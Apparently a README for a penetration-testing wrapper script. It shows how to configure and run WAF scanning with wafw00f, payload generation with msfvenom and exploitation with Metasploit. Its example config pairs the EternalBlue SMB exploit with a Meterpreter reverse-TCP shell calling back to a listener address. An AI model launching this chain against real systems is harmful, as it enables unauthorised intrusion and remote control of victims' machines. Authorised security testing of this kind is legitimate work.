-------------------------------------------------------------
📌 Step 1: Install Dependencies
-------------------------------------------------------------
Before running the tool, install the required dependencies:

🔧 Install Required Packages:
$ pip install pyyaml
$ sudo apt install wafw00f metasploit-framework

-------------------------------------------------------------
📌 Step 2: Configure config.yaml
-------------------------------------------------------------
Modify the `config.yaml` file to set your target, payload settings, and Metasploit 
exploit details.

Example config.yaml:
target: "example.com"  # Target for scanning

payload:
  type: "windows/meterpreter/reverse_tcp"
  lhost: "192.168.1.100"
  lport: "4444"

metasploit:
  exploit: "exploit/windows/smb/ms17_010_eternalblue"
  payload: "windows/meterpreter/reverse_tcp"
  rhost: "192.168.1.100"
  lhost: "192.168.1.100"
  lport: "4444"

-------------------------------------------------------------
📌 Step 3: Run the Tool
-------------------------------------------------------------

1️⃣ Scan a Target for WAF using WafW00f
$ python vapt_tool.py --scan
📌 Output: Saves results in reports/waf_scan.json.

2️⃣ Generate a Payload using MSFvenom
$ python vapt_tool.py --payload
📌 Output: Saves payload in the payloads/ directory.

3️⃣ Exploit a Target using Metasploit
$ python vapt_tool.py --exploit
📌 Output: Saves logs in reports/exploit.log.

4️⃣ Run All Modules Together
$ python vapt_tool.py --scan --payload --exploit

-------------------------------------------------------------
📌 Step 4: View Reports and Logs
-------------------------------------------------------------

- WAF Scan Results: reports/waf_scan.json
- Payload File: payloads/<payload_name>.exe
- Exploit Logs: reports/exploit.log
- Activity Logs: logs/vapt.log

To check logs:
$ cat logs/vapt.log